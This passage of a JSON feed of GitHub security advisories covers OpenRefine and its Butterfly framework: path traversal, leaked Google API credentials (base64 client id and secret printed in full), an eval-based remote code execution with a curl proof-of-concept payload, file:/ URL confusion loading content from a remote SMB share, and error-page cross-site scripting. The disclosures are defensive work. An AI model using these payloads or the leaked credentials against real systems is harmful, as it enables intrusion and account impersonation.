            "content_html": "<p>The load-language command expects a <code>lang</code> parameter from which it constructs the path of the localization file to load, of the form <code>translations-$LANG.json</code>.\nWhen doing so, it does not check that the resulting path is in the expected directory, which means that this command could be exploited to read other JSON files on the file system.</p>\n<p>The command should be patched by checking that the normalized path is in the expected directory.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/OpenRefine/OpenRefine/security/advisories/GHSA-qfwq-6jh6-8xx4\">https://github.com/OpenRefine/OpenRefine/security/advisories/GHSA-qfwq-6jh6-8xx4</a></li>\n<li><a href=\"https://github.com/OpenRefine/OpenRefine/commit/24d084052dc55426fe460f2a17524fd18d28b20c\">https://github.com/OpenRefine/OpenRefine/commit/24d084052dc55426fe460f2a17524fd18d28b20c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-49760\">https://nvd.nist.gov/vuln/detail/CVE-2024-49760</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qfwq-6jh6-8xx4\">https://github.com/advisories/GHSA-qfwq-6jh6-8xx4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qfwq-6jh6-8xx4",
            "title": "[org.openrefine:openrefine] OpenRefine has a path traversal in LoadLanguageCommand",
            "date_modified": "2024-10-25T16:47:18.000Z",
            "date_published": "2024-10-24T18:32:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qfwq-6jh6-8xx4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>OpenRefine releases contain Google API authentication keys (\"client id\" and \"client secret\") which can be extracted from released artifacts. For instance, download the package for OpenRefine 3.8.2 on linux. It contains the file <code>openrefine-3.8.2/webapp/extensions/gdata/module/MOD-INF/lib/openrefine-gdata.jar</code>, which can be extracted.\nThis archive then contains the file <code>com/google/refine/extension/gdata/GoogleAPIExtension.java</code>, which contains the following lines:</p>\n<pre><code class=\"language-java\">    // For a production release, the second parameter (default value) can be set\n    // for the following three properties (client_id, client_secret, and API key) to\n    // the production values from the Google API console\n    private static final String CLIENT_ID = System.getProperty(\"ext.gdata.clientid\", new String(Base64.getDecoder().decode(\"ODk1NTU1ODQzNjMwLWhkZWwyN3NxMDM5ZjFwMmZ0aGE2M2VvcWFpY2JwamZoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29t\")));\n    private static final String CLIENT_SECRET = System.getProperty(\"ext.gdata.clientsecret\", new String(Base64.getDecoder().decode(\"R2V2TnZiTnA2a3IxeDd5c3VZNENmYlNo\")));\n</code></pre>\n<p>The Base64 encoding can then be decoded to obtain the client id and client secret.\nThose credentials can then be used by other applications to request access to Google accounts, pretending they are OpenRefine. This assumes that they also get access to the user access tokens, which this vulnerability doesn't expose by itself.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The bundled credentials should be revoked.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Users should revoke access to their Google account if they have connected it to OpenRefine.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/OpenRefine/OpenRefine/security/advisories/GHSA-3pg4-qwc8-426r\">https://github.com/OpenRefine/OpenRefine/security/advisories/GHSA-3pg4-qwc8-426r</a></li>\n<li><a href=\"https://github.com/OpenRefine/OpenRefine/commit/07dd61e00bb7f472ddcb243631299fba95ad90dd\">https://github.com/OpenRefine/OpenRefine/commit/07dd61e00bb7f472ddcb243631299fba95ad90dd</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3pg4-qwc8-426r\">https://github.com/advisories/GHSA-3pg4-qwc8-426r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3pg4-qwc8-426r",
            "title": "[org.openrefine:openrefine] OpenRefine leaks Google API credentials in releases",
            "date_modified": "2024-10-24T18:30:01.000Z",
            "date_published": "2024-10-24T18:30:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3pg4-qwc8-426r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Usage of the <code>Butterfly.prototype.parseJSON</code> or <code>getJSON</code> functions on an attacker-controlled crafted input string allows the attacker to execute arbitrary JavaScript code on the server.</p>\n<p>Since Butterfly JavaScript code has access to Java classes, it can run arbitrary programs.</p>\n<h3 id=\"details\">Details</h3>\n<p>The <code>parseJSON</code> function (edu/mit/simile/butterfly/Butterfly.js:64) works by calling <code>eval</code>, an approach that goes back to the original library by Crockford, before JSON was part of the ECMAScript language. It uses a regular expression to remove strings from the input, then checks that there are no unexpected characters in the non-string remainder.</p>\n<p>However, the regex is imperfect, as was <a href=\"https://dev.to/mikesamuel/2008-silently-securing-jsonparse-5cbb\">discovered earlier by Mike Samuel</a>; specifically, the \"cleaner\" can be tricked into treating part of the input as a string that the \"evaluator\" does not, because of a difference in interpretation regarding the <a href=\"https://unicode-explorer.com/c/200D\">the Unicode zero-width joiner character</a>. Representing that character with a visible symbol, a malicious input looks like:</p>\n<pre><code class=\"language-js\">\"\\�\\\", Packages.java.lang.Runtime.getRuntime().exec('gnome-calculator')) // \"\n</code></pre>\n<p>This is understood...</p>\n<ul>\n<li>by <code>JSON_cleaning_RE</code> as a single string, and because it is a string it can be collapsed to nothing, which is not problematic, so the original input proceeds to <code>eval</code>.</li>\n<li>by the <code>eval</code> function, which ignores zero-width joiners entirely, as a string containing a single escaped backslash, followed by a comma, then a function call, closing parenthesis, and finally a line comment.</li>\n</ul>\n<p>The function call is evaluated, and a calculator is opened.</p>\n<p>Possible mitigations and additional defenses could include:</p>\n<ul>\n<li>Replacing the JSON implementation with Rhino's built-in implementation.</li>\n<li>Dropping all JSON-related and JSONP-related code entirely.</li>\n<li>Restricting the access the JavaScript controller code has to the rest of the system by using <code>initSafeStandardObjects</code> instead of <code>initStandardObjects</code>, using <code>setClassShutter</code>, and so on.</li>\n</ul>\n<h3 id=\"poc\">PoC</h3>\n<p>Change OpenRefine <code>core</code> <code>controller.js</code> to add a call to the vulnerable <code>getJSON</code> function:</p>\n<pre><code class=\"language-diff\">diff --git a/main/webapp/modules/core/MOD-INF/controller.js b/main/webapp/modules/core/MOD-INF/controller.js\nindex 4ceba0676..1ce0936d2 100644\n--- a/main/webapp/modules/core/MOD-INF/controller.js\n+++ b/main/webapp/modules/core/MOD-INF/controller.js\n@@ -631,0 +632,5 @@ function process(path, request, response) {\n+    if (path == \"getjsontest\") {\n+      butterfly.getJSON(request);\n+      return true;\n+    }\n+\n</code></pre>\n<p>Then, restart OpenRefine and submit the malicious request. For example, the following <code>bash</code> command (with $' quoting) should do it:</p>\n<pre><code>curl -H 'Content-Type: application/json;charset=utf-8' --data $'\"\\\\\\u200d\\\\\", Packages.java.lang.Runtime.getRuntime().exec(\\'gnome-calculator\\')) // \"' http://localhost:3333/getjsontest\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Any JavaScript controller that calls one of these functions is vulnerable to remote code execution.</p>\n<p>OpenRefine itself seems unaffected; both OpenRefine and jQuery have their own functions also called parseJSON and getJSON, but those are unrelated.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/OpenRefine/simile-butterfly/security/advisories/GHSA-mpcw-3j5p-p99x\">https://github.com/OpenRefine/simile-butterfly/security/advisories/GHSA-mpcw-3j5p-p99x</a></li>\n<li><a href=\"https://github.com/OpenRefine/simile-butterfly/commit/2ad1fa4cd8afe3c920c8e6e04fe7a7df5cf8294e\">https://github.com/OpenRefine/simile-butterfly/commit/2ad1fa4cd8afe3c920c8e6e04fe7a7df5cf8294e</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mpcw-3j5p-p99x\">https://github.com/advisories/GHSA-mpcw-3j5p-p99x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mpcw-3j5p-p99x",
            "title": "[org.openrefine.dependencies:butterfly] Butterfly's parseJSON, getJSON functions eval malicious input, leading to remote code execution (RCE)",
            "date_modified": "2024-10-24T18:27:51.000Z",
            "date_published": "2024-10-24T18:27:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mpcw-3j5p-p99x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The Butterfly framework uses the <code>java.net.URL</code> class to refer to (what are expected to be) local resource files, like images or templates. This works: \"opening a connection\" to these URLs opens the local file. However, if a <code>file:/</code> URL is directly given where a relative path (resource name) is expected, this is also accepted in some code paths; the app then fetches the file, from a remote machine if indicated, and uses it as if it was a trusted part of the app's codebase.</p>\n<p>This leads to multiple weaknesses and potential weaknesses:</p>\n<ul>\n<li>An attacker that has network access to the application could use it to gain access to files, either on the the server's filesystem (path traversal) or shared by nearby machines (server-side request forgery with e.g. SMB).</li>\n<li>An attacker that can lead or redirect a user to a crafted URL belonging to the app could cause arbitrary attacker-controlled JavaScript to be loaded in the victim's browser (cross-site scripting).</li>\n<li>If an app is written in such a way that an attacker can influence the resource name used for a template, that attacker could cause the app to fetch and execute an attacker-controlled template (remote code execution).</li>\n</ul>\n<h3 id=\"details\">Details</h3>\n<p>The <code>edu.mit.simile.butterfly.ButterflyModuleImpl.getResource</code> method converts a resource name into an URL, for instance:</p>\n<pre><code>images/logo-gem-126.svg\nfile:/C:/Users/Wander/IdeaProjects/OpenRefine/main/webapp/modules/core/images/logo-gem-126.svg\n</code></pre>\n<p>If the resource name already starts with <code>file:/</code>, it is passed through unmodified (line 287). There is no check that the resulting URL is inside the expected directory or on the same machine.</p>\n<p>The default implementation for <code>process</code> in <code>ButterflyModuleImpl</code> is to serve a named resource, which makes it vulnerable. The Velocity template library is bound to the same <code>getResource</code> implementation through the <code>ButterflyResourceLoader</code> class, which means it is also vulnerable if template resource names can somehow be influenced by an attacker.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>This demonstration has been tested with <a href=\"https://github.com/OpenRefine/OpenRefine\">OpenRefine</a> on a Windows machine. Start OpenRefine, create a file (here <code>example.js</code>) with some contents, then concatenate the OpenRefine URL and its <code>file:/</code> URL, as follows:</p>\n<pre><code>http://localhost:3333/file:/C:/Users/Wander/example.js\n</code></pre>\n<p>The file is read and sent to the browser. Then, visit:</p>\n<pre><code>http://localhost:3333/file:%2f%2fwandernauta.nl/public/demo.html\n</code></pre>\n<p>Assuming there are no firewalls in the way, the HTML page is retrieved from the public SMB (Samba) network share and sent to the browser, which executes the embedded JavaScript.</p>\n<p>In the case of OpenRefine specifically, to demonstrate the attacker-controlled template name case:</p>\n<pre><code>http://localhost:3333/file:%2f%2fwandernauta.nl/public/index\n</code></pre>\n<p>An <code>index.vt</code> template containing the snippet above is retrieved from the same share, which is then executed; the Windows calculator opens.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Depending on how the framework is used: path traversal, XSS, SSRF; potentially RCE.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/OpenRefine/simile-butterfly/security/advisories/GHSA-3p8v-w8mr-m3x8\">https://github.com/OpenRefine/simile-butterfly/security/advisories/GHSA-3p8v-w8mr-m3x8</a></li>\n<li><a href=\"https://github.com/OpenRefine/simile-butterfly/commit/537f64bfa72746f8b21d4bda461fad843435319c\">https://github.com/OpenRefine/simile-butterfly/commit/537f64bfa72746f8b21d4bda461fad843435319c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47883\">https://nvd.nist.gov/vuln/detail/CVE-2024-47883</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3p8v-w8mr-m3x8\">https://github.com/advisories/GHSA-3p8v-w8mr-m3x8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3p8v-w8mr-m3x8",
            "title": "[org.openrefine.dependencies:butterfly] Butterfly has path/URL confusion in resource handling leading to multiple weaknesses",
            "date_modified": "2024-10-29T20:01:08.000Z",
            "date_published": "2024-10-24T18:16:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3p8v-w8mr-m3x8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The built-in \"Something went wrong!\" error page includes the exception message and exception traceback without escaping HTML tags, enabling injection into the page if an attacker can reliably produce an error with an attacker-influenced message.</p>\n<p>It appears that the only way to reach this code in OpenRefine itself is for an attacker to somehow convince a victim to import a malicious file, as in GHSA-m88m-crr9-jvqq, which may be difficult.  However, out-of-tree extensions may add their own calls to <code>respondWithErrorPage</code>.</p>\n<h3 id=\"details\">Details</h3>\n<p>The <code>Command.respondWithErrorPage</code> (through <code>HttpUtilities.respondWithErrorPage</code>) function renders the Velocity template <code>error.vt</code>, which contains the <code>$message</code> and <code>$stack</code> variables, which are included in the response as-is:</p>\n<p><a href=\"https://github.com/OpenRefine/OpenRefine/blob/master/main/webapp/modules/core/error.vt#L52-L53\">https://github.com/OpenRefine/OpenRefine/blob/master/main/webapp/modules/core/error.vt#L52-L53</a></p>\n<p>However, the message can contain HTML tags, which would then be interpreted by the browser. A mitigation would be to escape both the message and stack trace, perhaps using Guava's HTML escaper.</p>\n<p>Flows that report errors as <code>application/json</code> responses are not interpreted by the browser and so not affected by this issue.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>In OpenRefine, use the \"Import project\" feature to import the following URL (or upload it as a file): <a href=\"https://wandernauta.nl/oa/example.tar.gz\">https://wandernauta.nl/oa/example.tar.gz</a></p>\n<p>A JavaScript alert appears.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Execution of arbitrary JavaScript in the victim's browser, provided the victim can be convinced to import a malicious project. The script can do anything the user can do.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/OpenRefine/OpenRefine/security/advisories/GHSA-j8hp-f2mj-586g\">https://github.com/OpenRefine/OpenRefine/security/advisories/GHSA-j8hp-f2mj-586g</a></li>\n<li><a href=\"https://github.com/OpenRefine/OpenRefine/commit/85594e75e7b36025f7b6a67dcd3ec253c5dff8c2\">https://github.com/OpenRefine/OpenRefine/commit/85594e75e7b36025f7b6a67dcd3ec253c5dff8c2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47882\">https://nvd.nist.gov/vuln/detail/CVE-2024-47882</a></li>\n<li><a href=\"https://github.com/OpenRefine/OpenRefine/blob/master/main/webapp/modules/core/error.vt#L52-L53\">https://github.com/OpenRefine/OpenRefine/blob/master/main/webapp/modules/core/error.vt#L52-L53</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j8hp-f2mj-586g\">https://github.com/advisories/GHSA-j8hp-f2mj-586g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j8hp-f2mj-586g",
            "title": "[org.openrefine:openrefine] OpenRefine's error page lacks escaping, leading to potential Cross-site Scripting on import of malicious project",
            "date_modified": "2024-10-24T21:46:04.000Z",
            "date_published": "2024-10-24T18:13:04.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j8hp-f2mj-586g"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}